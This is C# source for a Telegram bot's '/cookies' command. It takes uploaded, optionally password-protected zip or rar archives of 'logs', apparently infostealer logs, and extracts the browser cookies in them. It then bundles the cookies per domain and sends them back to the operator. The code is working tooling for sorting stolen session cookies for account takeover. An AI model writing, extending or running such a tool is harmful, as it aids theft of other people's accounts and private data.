using System.Text.RegularExpressions;
using Core.Models.Configs;
using Core.Parsers;
using TelegramBot.Models;
using TelegramBot.Services;
using TL;
using WTelegram;

namespace TelegramBot.Commands.Main;

public class CookiesCommand(Client client, ParsingConfig cfgParse, DataService data, Random random) : ICommand
{
    public bool AuthorizedOnly { get; } = true;

    private static readonly Regex _args = new("/cookies \"(.*?)\"( \"(.*?)\")?");
    public Task Invoke(UpdateNewMessage update, User user)
    {
        if (update.message is Message msg)
            if (msg.message.StartsWith("/cookies"))
            {
                var args = _args.Match(msg.message);
                var archivepath = data.GetLogsPath(args.Groups[1].Value);

                if (archivepath is null) return client.Messages_SendMessage(user, $"Archive {args.Groups[1].Value} doesn't exists", random.NextInt64());

                return ProcessArchive(user, archivepath, args.Groups[3].Success ? args.Groups[3].Value : null);
            }
        
        App.Default.Add(update.message.Peer.ID, HandleCookiesAsync);

        return client.Messages_SendMessage(
            user,
            "Send zip/rar file with logs",
            random.NextInt64(),
            reply_markup: App.CancelReplyKeyboardMarkup);
    }
    
    private async Task HandleCookiesAsync(UpdateNewMessage update, User user)
    {
        // download
        var filepath = await data.DownloadFileFromMessageAsync(user, update);
        
        if (filepath is null) return;

        await ProcessArchive(user, filepath, GetPassword(((Message) update.message).message));
    }

    private async Task ProcessArchive(InputPeer peer, string filepath, string? password)
    {
        //  extracting
        if (await data.ExtractFilesAsync(peer, filepath, password) is not { } dir) return;

        // parsing
        var filename = filepath[(filepath.LastIndexOf('\\') + 1)..filepath.LastIndexOf('.')];

        await client.Messages_SendMessage(peer, $"Start parsing cookies from {filename}", random.NextInt64());

        foreach (var (cookie, cookies) in cfgParse.Cookies.CookiesFromLogs(dir))
        {
            var path = await data.SaveZipAsync(
                dir[(dir.LastIndexOf('\\') + 1)..],
                "cookies",
                cookie.Domains.First(),
                cookies.ToArray(),
                name: "Cookies");

            await data.SendFileAsync(peer, path);
        }

        await client.Messages_SendMessage(peer, $"{filename} successfully processed", random.NextInt64());
    }

    private static readonly Regex _password = new(@"(P|p)?ass(word)?.?[a-zA-Z0-9]*?\s?(:|-)?\s?(.+)($|\n)");
    private string? GetPassword(string text)
    {
        var password = _password.Match(text).Groups[4].Value;

        if (password.ToLower() is "none" or "\u2796") return null;

        return password;
    }
}